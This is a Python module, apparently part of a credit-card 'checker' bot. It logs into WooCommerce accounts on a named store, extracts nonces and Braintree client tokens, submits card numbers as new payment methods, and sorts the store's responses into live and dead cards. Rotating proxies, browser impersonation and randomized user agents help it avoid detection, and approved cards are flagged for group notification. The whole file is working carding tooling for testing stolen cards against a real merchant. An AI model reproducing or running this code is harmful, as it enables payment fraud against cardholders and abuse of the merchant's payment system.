"""
gateways/wc_bt_gate.py — WooCommerce + Braintree Auto-Login Gate

Auto-logs into WooCommerce accounts using email/password,
extracts BT client token, tokenizes cards, and submits for auth check.

Flow:
  1. POST /wp-login.php → WordPress session cookies
  2. GET /my-account/add-payment-method/ → WC nonce + BT token
  3. POST payments.braintree-api.com/graphql → tokenize card (no charge)
  4. POST /my-account/add-payment-method/ → WooCommerce response
  5. Parse → LIVE (added) / DO_NOT_HONOR / DEAD

Features:
  - In-memory session cache (60 min TTL, avoids re-login on mass check)
  - Proxy rotation on every request
  - Multiple BT token extraction strategies
  - Group notification: masked CC sent when card approved
"""
import asyncio
import base64
import json
import logging
import random
import re
import time
from typing import Optional
from urllib.parse import urljoin, urlparse

from gateways.base import GatewayResult, CCStatus
from core.parser import CardData
from core.proxy_manager import get_random_proxy

logger = logging.getLogger("CC-Checker.WCBT")

TIMEOUT = 25  # seconds
SITE_URL = "https://www.camius.com"

# ── In-memory session cache ────────────────────────────────────────────────────
# key = (site_url, email) → {cookies, wc_nonce, bt_token, expires_at}
_session_cache: dict[tuple, dict] = {}
_SESSION_TTL = 3600  # 1 hour


def _get_proxy() -> Optional[str]:
    try:
        proxy = get_random_proxy()
        return proxy or None
    except Exception:
        return None


def _random_ua() -> str:
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    ]
    return random.choice(uas)


# ── Response classifier ────────────────────────────────────────────────────────
def _classify_response(text: str) -> tuple[CCStatus, str, bool]:
    """Parse WooCommerce response text → (CCStatus, message, is_live)."""
    t = text.lower().strip()

    # ✅ Approved / Card Added
    approved_signals = [
        "payment method successfully added",
        "payment method added",
        "added successfully",
        "new payment method added",
    ]
    for sig in approved_signals:
        if sig in t:
            return CCStatus.LIVE_VBV, "✅ Payment Method Added", True

    # ⚡ Live signals (bank responded — card is real)
    live_signals = {
        "do not honor":           ("DO_NOT_HONOR",  CCStatus.DO_NOT_HONOR),
        "insufficient funds":     ("Insufficient Funds", CCStatus.INSUFFICIENT),
        "insufficient_funds":     ("Insufficient Funds", CCStatus.INSUFFICIENT),
        "gateway rejected: avs":  ("AVS Mismatch — LIVE", CCStatus.INSUFFICIENT),
        "invalid postal code":    ("Postal Mismatch — LIVE", CCStatus.INSUFFICIENT),
        "card issuer declined cvv": ("CVV Mismatch — LIVE", CCStatus.CHARGED),
        "gateway rejected: cvv":  ("CVV Rejected — LIVE", CCStatus.CHARGED),
        "gateway rejected: avs_and_cvv": ("AVS+CVV — LIVE", CCStatus.CHARGED),
        "duplicate":              ("Duplicate — LIVE", CCStatus.INSUFFICIENT),
        "please wait":            ("Rate Limited — LIVE", CCStatus.INSUFFICIENT),
        "cannot add a new payment method so soon": ("Too Fast — LIVE", CCStatus.INSUFFICIENT),
    }
    for signal, (label, status) in live_signals.items():
        if signal in t:
            return status, label, True

    # ❌ Dead signals
    dead_signals = [
        "declined", "invalid card", "card number is invalid",
        "expired", "lost or stolen", "restricted card",
        "no such issuer", "transaction not permitted",
        "processor declined", "honor with id", "card not supported",
    ]
    for sig in dead_signals:
        if sig in t:
            return CCStatus.DEAD, text[:80] or "Declined", False

    # Unknown — treat as DEAD (conservative)
    return CCStatus.DEAD, text[:80] or "Unknown response", False


# ── Step 1: WordPress Login ────────────────────────────────────────────────────
async def _wp_login(
    site_url: str, email: str, password: str, proxy: Optional[str]
) -> Optional[dict]:
    """
    Login to WordPress with email/password.
    Returns session cookies dict on success, None on failure.
    """
    try:
        from curl_cffi.requests import AsyncSession

        login_url = f"{site_url}/wp-login.php"
        ua = _random_ua()

        async with AsyncSession(impersonate="chrome131") as s:
            # First GET to get cookies (login form)
            r = await s.get(
                login_url,
                headers={"User-Agent": ua},
                proxies={"https": proxy, "http": proxy} if proxy else None,
                timeout=TIMEOUT,
                allow_redirects=True,
            )
            init_cookies = dict(s.cookies)

            # POST login
            data = {
                "log":         email,
                "pwd":         password,
                "wp-submit":   "Log In",
                "redirect_to": f"{site_url}/my-account/",
                "testcookie":  "1",
            }
            r2 = await s.post(
                login_url,
                data=data,
                headers={
                    "User-Agent":    ua,
                    "Content-Type":  "application/x-www-form-urlencoded",
                    "Referer":       login_url,
                    "Origin":        site_url,
                },
                proxies={"https": proxy, "http": proxy} if proxy else None,
                timeout=TIMEOUT,
                allow_redirects=True,
            )
            cookies = dict(s.cookies)

            # Verify login: should have wordpress_logged_in_ cookie
            logged_in = any("wordpress_logged_in" in k for k in cookies)
            if not logged_in and "my-account" not in (r2.url or ""):
                logger.debug(f"WCBT login failed for {email}: no wp login cookie")
                return None

            logger.debug(f"WCBT login OK: {email} → {len(cookies)} cookies")
            return cookies

    except Exception as e:
        logger.debug(f"WCBT login error: {type(e).__name__}: {e}")
        return None


# ── Step 2: Get WC Nonce + BT Authorization Fingerprint ───────────────────────
async def _get_nonce_and_bt_token(
    site_url: str, cookies: dict, proxy: Optional[str]
) -> tuple[Optional[str], Optional[str]]:
    """
    GET /my-account/add-payment-method/ with session cookies.
    Returns (wc_nonce, bt_authorization_fingerprint).
    """
    try:
        from curl_cffi.requests import AsyncSession

        pay_url = f"{site_url}/my-account/add-payment-method/"
        ua = _random_ua()

        async with AsyncSession(impersonate="chrome131") as s:
            r = await s.get(
                pay_url,
                headers={
                    "User-Agent":  ua,
                    "Referer":     f"{site_url}/my-account/payment-methods/",
                    "Accept":      "text/html,application/xhtml+xml,*/*",
                },
                cookies=cookies,
                proxies={"https": proxy, "http": proxy} if proxy else None,
                timeout=TIMEOUT,
                allow_redirects=True,
            )
            html = r.text
            # Merge cookies (session might update them)
            merged_cookies = {**cookies, **dict(s.cookies)}

        # ── Extract WC nonce (multiple patterns) ──────────────────────────────
        wc_nonce = None
        for pat in [
            r'name=["\']woocommerce-add-payment-method-nonce["\'][^>]*value=["\']([a-f0-9]+)["\']',
            r'value=["\']([a-f0-9]+)["\'][^>]*name=["\']woocommerce-add-payment-method-nonce["\']',
            r'"woocommerce-add-payment-method-nonce"\s*:\s*"([a-f0-9]+)"',
            r'woocommerce-add-payment-method-nonce["\s]+value["\s=]+([a-f0-9]{8,})',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                wc_nonce = m.group(1)
                break

        # ── Extract BT authorization fingerprint ──────────────────────────────
        bt_fingerprint = None

        # Strategy 1: authorizationFingerprint directly in HTML
        m = re.search(r'"authorizationFingerprint"\s*:\s*"([A-Za-z0-9._\-]+)"', html)
        if m:
            bt_fingerprint = m.group(1)

        # Strategy 2: base64-encoded wc_braintree_client_token (standard plugin)
        if not bt_fingerprint:
            for pat in [
                r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]',
                r'braintreeClientToken\s*[=:]\s*["\']([A-Za-z0-9+/._=-]{40,})["\']',
                r'clientToken\s*[=:]\s*["\']([A-Za-z0-9+/._=-]{40,})["\']',
                r'data-client-token=["\']([A-Za-z0-9+/._=-]{40,})["\']',
            ]:
                m2 = re.search(pat, html, re.IGNORECASE)
                if m2:
                    raw = m2.group(1)
                    if raw.startswith("eyJ"):
                        # Raw JWT — use directly as Bearer
                        bt_fingerprint = raw
                        break
                    try:
                        decoded = base64.b64decode(raw + "==").decode("utf-8", errors="replace")
                        fp = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                        if fp:
                            bt_fingerprint = fp.group(1)
                            break
                    except Exception:
                        pass

        # Strategy 3: Commerce Kit AJAX for client token
        if not bt_fingerprint and wc_nonce:
            bt_fingerprint = await _fetch_bt_token_ajax(site_url, merged_cookies, wc_nonce, proxy, ua)

        if not wc_nonce:
            logger.debug("WCBT: WC nonce not found in page")
        if not bt_fingerprint:
            logger.debug("WCBT: BT fingerprint not found")

        return wc_nonce, bt_fingerprint

    except Exception as e:
        logger.debug(f"WCBT nonce/token error: {type(e).__name__}: {e}")
        return None, None


async def _fetch_bt_token_ajax(
    site_url: str, cookies: dict, nonce: str, proxy: Optional[str], ua: str
) -> Optional[str]:
    """Fallback: Call Commerce Kit / WooCommerce AJAX to get BT client token."""
    try:
        from curl_cffi.requests import AsyncSession

        # Commerce Kit specific endpoints
        endpoints = [
            f"{site_url}/?wc-ajax=get_braintree_client_token",
            f"{site_url}/wp-admin/admin-ajax.php",
        ]
        payloads = [
            {"nonce": nonce},
            {"action": "get_braintree_client_token", "nonce": nonce},
        ]

        async with AsyncSession(impersonate="chrome131") as s:
            for url, payload in zip(endpoints, payloads):
                try:
                    r = await s.post(
                        url,
                        data=payload,
                        headers={
                            "User-Agent":   ua,
                            "X-Requested-With": "XMLHttpRequest",
                            "Referer":      f"{site_url}/my-account/add-payment-method/",
                        },
                        cookies=cookies,
                        proxies={"https": proxy, "http": proxy} if proxy else None,
                        timeout=10,
                    )
                    text = r.text
                    # Try to parse as JSON
                    try:
                        data = json.loads(text)
                        token = data.get("token") or data.get("client_token") or data.get("clientToken")
                        if token:
                            if token.startswith("eyJ"):
                                return token
                            # Might be base64 encoded
                            decoded = base64.b64decode(token + "==").decode("utf-8", errors="replace")
                            fp = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                            if fp:
                                return fp.group(1)
                    except Exception:
                        # Look for JWT in raw response
                        jwt_match = re.search(r'"(eyJ[A-Za-z0-9._\-]{50,})"', text)
                        if jwt_match:
                            return jwt_match.group(1)
                except Exception:
                    continue
    except Exception:
        pass
    return None


# ── Step 3: Tokenize Card via Braintree GraphQL ────────────────────────────────
async def _tokenize_card(
    bt_token: str, card: CardData, proxy: Optional[str]
) -> Optional[str]:
    """Tokenize card via Braintree API. Returns nonce string or None."""
    try:
        from curl_cffi.requests import AsyncSession

        exp_year = card.year if len(card.year) == 4 else f"20{card.year}"
        session_id = (
            f"{random.randint(10**7, 10**8-1)}-"
            f"{random.randint(1000, 9999)}-"
            f"{random.randint(1000, 9999)}-"
            f"{random.randint(1000, 9999)}-"
            f"{random.randint(10**11, 10**12-1)}"
        )

        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": session_id,
            },
            "query": (
                "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
                " tokenizeCreditCard(input: $input) {"
                " token creditCard { bin brandCode last4 expirationMonth expirationYear"
                " binData { prepaid healthcare debit issuingBank countryOfIssuance } } } }"
            ),
            "variables": {
                "input": {
                    "creditCard": {
                        "number":           card.number,
                        "expirationMonth":  card.month.zfill(2),
                        "expirationYear":   exp_year,
                        "cvv":              card.cvv,
                        "billingAddress": {
                            "postalCode":    "10001",
                            "streetAddress": "123 Main St",
                        },
                    },
                    "options": {"validate": False},
                }
            },
            "operationName": "TokenizeCreditCard",
        }

        headers = {
            "Authorization":     f"Bearer {bt_token}",
            "Braintree-Version": "2018-05-10",
            "Content-Type":      "application/json",
            "Accept":            "*/*",
            "Origin":            SITE_URL,
            "Referer":           f"{SITE_URL}/",
            "User-Agent":        _random_ua(),
        }

        async with AsyncSession(impersonate="chrome131") as s:
            r = await s.post(
                "https://payments.braintree-api.com/graphql",
                headers=headers,
                json=payload,
                proxies={"https": proxy, "http": proxy} if proxy else None,
                timeout=TIMEOUT,
            )
            if r.status_code != 200:
                logger.debug(f"WCBT tokenize HTTP {r.status_code}")
                return None
            data = r.json()
            if "errors" in data:
                logger.debug(f"WCBT tokenize errors: {data['errors']}")
                return None
            token = (
                data.get("data", {})
                    .get("tokenizeCreditCard", {})
                    .get("token")
            )
            return token

    except Exception as e:
        logger.debug(f"WCBT tokenize error: {e}")
        return None


# ── Step 4: Submit to WooCommerce ──────────────────────────────────────────────
async def _submit_woocommerce(
    site_url: str, cookies: dict, card_token: str, wc_nonce: str, proxy: Optional[str]
) -> str:
    """Submit tokenized card to WooCommerce add-payment-method. Returns response text."""
    try:
        from curl_cffi.requests import AsyncSession

        form_data = {
            "payment_method":                       "braintree_cc",
            "braintree_cc_nonce_key":               card_token,
            "braintree_cc_device_data":             '{"correlation_id":"wc-bt-checker"}',
            "braintree_cc_3ds_nonce_key":           "",
            "woocommerce-add-payment-method-nonce": wc_nonce,
            "_wp_http_referer":                     "/my-account/add-payment-method/",
            "woocommerce_add_payment_method":       "1",
        }
        ua = _random_ua()

        async with AsyncSession(impersonate="chrome131") as s:
            r = await s.post(
                f"{site_url}/my-account/add-payment-method/",
                data=form_data,
                headers={
                    "Content-Type":              "application/x-www-form-urlencoded",
                    "Accept":                    "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Accept-Language":           "en-US,en;q=0.9",
                    "Origin":                    site_url,
                    "Referer":                   f"{site_url}/my-account/add-payment-method/",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent":                ua,
                },
                cookies=cookies,
                proxies={"https": proxy, "http": proxy} if proxy else None,
                timeout=TIMEOUT,
                allow_redirects=True,
            )
            html = r.text

        # ── Extract WooCommerce notice message ─────────────────────────────────
        for pat in [
            r'class="woocommerce-notices-wrapper"[^>]*>(.*?)</div>',
            r'woocommerce-error[^>]*>(.*?)</[uo]l>',
            r'woocommerce-message[^>]*>(.*?)</[uo]l>',
            r'woocommerce-info[^>]*>(.*?)</div>',
            r'class="notice[^"]*"[^>]*>(.*?)</[a-z]+>',
        ]:
            m = re.search(pat, html, re.DOTALL | re.IGNORECASE)
            if m:
                cleaned = re.sub(r"<[^>]+>", " ", m.group(1)).strip()
                cleaned = re.sub(r"\s+", " ", cleaned).strip()
                if cleaned and len(cleaned) > 3:
                    return cleaned

        return "No response message found"

    except Exception as e:
        logger.debug(f"WCBT submit error: {e}")
        return f"Error: {e}"


# ── Session Cache Manager ──────────────────────────────────────────────────────
def _get_cached_session(site_url: str, email: str) -> Optional[dict]:
    key = (site_url, email)
    cached = _session_cache.get(key)
    if cached and time.monotonic() < cached["expires_at"]:
        return cached
    # Expired — remove
    _session_cache.pop(key, None)
    return None


def _cache_session(site_url: str, email: str, cookies: dict, wc_nonce: str, bt_token: str):
    key = (site_url, email)
    _session_cache[key] = {
        "cookies":    cookies,
        "wc_nonce":   wc_nonce,
        "bt_token":   bt_token,
        "expires_at": time.monotonic() + _SESSION_TTL,
    }


def invalidate_wc_bt_cache(site_url: Optional[str] = None, email: Optional[str] = None):
    """Invalidate cache entries for a site/email."""
    if site_url and email:
        _session_cache.pop((site_url, email), None)
    elif site_url:
        for k in list(_session_cache.keys()):
            if k[0] == site_url:
                _session_cache.pop(k, None)
    else:
        _session_cache.clear()


# ── Main Gate Entry Point ──────────────────────────────────────────────────────
async def check_wc_bt_gate(card: CardData) -> GatewayResult:
    """
    WooCommerce + Braintree auto-login gate.

    - Auto-logs in with stored credentials (camius.com)
    - Session cached 60 min (mass check efficient)
    - Proxy rotation on every call
    - Group notification triggered automatically on LIVE result
    """
    import database.db as db

    # Pick site (default: camius.com)
    site_url = SITE_URL

    accounts = await db.wc_bt_get_active_accounts(site_url)
    if not accounts:
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway="WC-Braintree",
            message="No WC+BT accounts configured. Use /wcbtadd email password",
            raw_code="no_accounts",
        )

    # Pick best account (least failures)
    account = random.choice(accounts[:3]) if len(accounts) >= 3 else accounts[0]
    email    = account["email"]
    password = account["password"]
    acc_id   = account["id"]

    proxy = _get_proxy()

    # ── Try cached session first ───────────────────────────────────────────────
    cached = _get_cached_session(site_url, email)
    if cached:
        wc_nonce  = cached["wc_nonce"]
        bt_token  = cached["bt_token"]
        cookies   = cached["cookies"]
        logger.debug(f"WCBT: Using cached session for {email}")
    else:
        # ── Login fresh ────────────────────────────────────────────────────────
        logger.debug(f"WCBT: Logging in {email}...")
        cookies = await _wp_login(site_url, email, password, proxy)
        if not cookies:
            # Retry with different proxy
            proxy = _get_proxy()
            cookies = await _wp_login(site_url, email, password, proxy)
        if not cookies:
            await db.wc_bt_increment_stats(acc_id, success=False)
            return GatewayResult(
                status=CCStatus.ERROR,
                gateway="WC-Braintree",
                message=f"Login failed for {email}. Check credentials.",
                raw_code="login_failed",
                extra={"account": email},
            )

        # ── Extract nonce + BT token ───────────────────────────────────────────
        wc_nonce, bt_token = await _get_nonce_and_bt_token(site_url, cookies, proxy)
        if not wc_nonce:
            await db.wc_bt_increment_stats(acc_id, success=False)
            return GatewayResult(
                status=CCStatus.ERROR,
                gateway="WC-Braintree",
                message="Could not extract WC nonce. Cookies may have expired.",
                raw_code="nonce_failed",
                extra={"account": email},
            )

        if not bt_token:
            await db.wc_bt_increment_stats(acc_id, success=False)
            return GatewayResult(
                status=CCStatus.ERROR,
                gateway="WC-Braintree",
                message="Could not extract Braintree token from page.",
                raw_code="bt_token_failed",
                extra={"account": email},
            )

        # Cache the session
        _cache_session(site_url, email, cookies, wc_nonce, bt_token)

    # ── Tokenize card ──────────────────────────────────────────────────────────
    proxy2 = _get_proxy()  # Fresh proxy for BT API
    card_token = await _tokenize_card(bt_token, card, proxy2)
    if not card_token:
        # BT token might be expired — invalidate cache and retry once
        invalidate_wc_bt_cache(site_url, email)
        # Try re-login
        cookies2 = await _wp_login(site_url, email, password, _get_proxy())
        if cookies2:
            wc_nonce2, bt_token2 = await _get_nonce_and_bt_token(site_url, cookies2, _get_proxy())
            if bt_token2:
                card_token = await _tokenize_card(bt_token2, card, _get_proxy())
                if card_token:
                    _cache_session(site_url, email, cookies2, wc_nonce2, bt_token2)
                    wc_nonce = wc_nonce2
                    cookies  = cookies2

    if not card_token:
        await db.wc_bt_increment_stats(acc_id, success=False)
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway="WC-Braintree",
            message="Card tokenization failed (BT token expired).",
            raw_code="tokenize_failed",
            extra={"account": email},
        )

    # ── Submit to WooCommerce ──────────────────────────────────────────────────
    proxy3 = _get_proxy()
    response_text = await _submit_woocommerce(site_url, cookies, card_token, wc_nonce, proxy3)

    # ── Classify result ────────────────────────────────────────────────────────
    status, message, is_live = _classify_response(response_text)

    await db.wc_bt_increment_stats(acc_id, success=is_live)

    # After a successful LIVE check, nonce is consumed — invalidate nonce in cache
    # (nonces are one-time use in WooCommerce)
    if is_live:
        invalidate_wc_bt_cache(site_url, email)

    domain = urlparse(site_url).netloc

    return GatewayResult(
        status=status,
        gateway="WC-Braintree",
        message=message,
        raw_code=status.value,
        is_vbv=(status == CCStatus.LIVE_VBV),
        is_non_vbv=(status == CCStatus.CHARGED),
        extra={
            "store_url": f"{domain} (WC+BT)",
            "account":   email,
            "proxy":     (proxy or "none")[:25],
            "raw_msg":   response_text[:100],
        },
    )
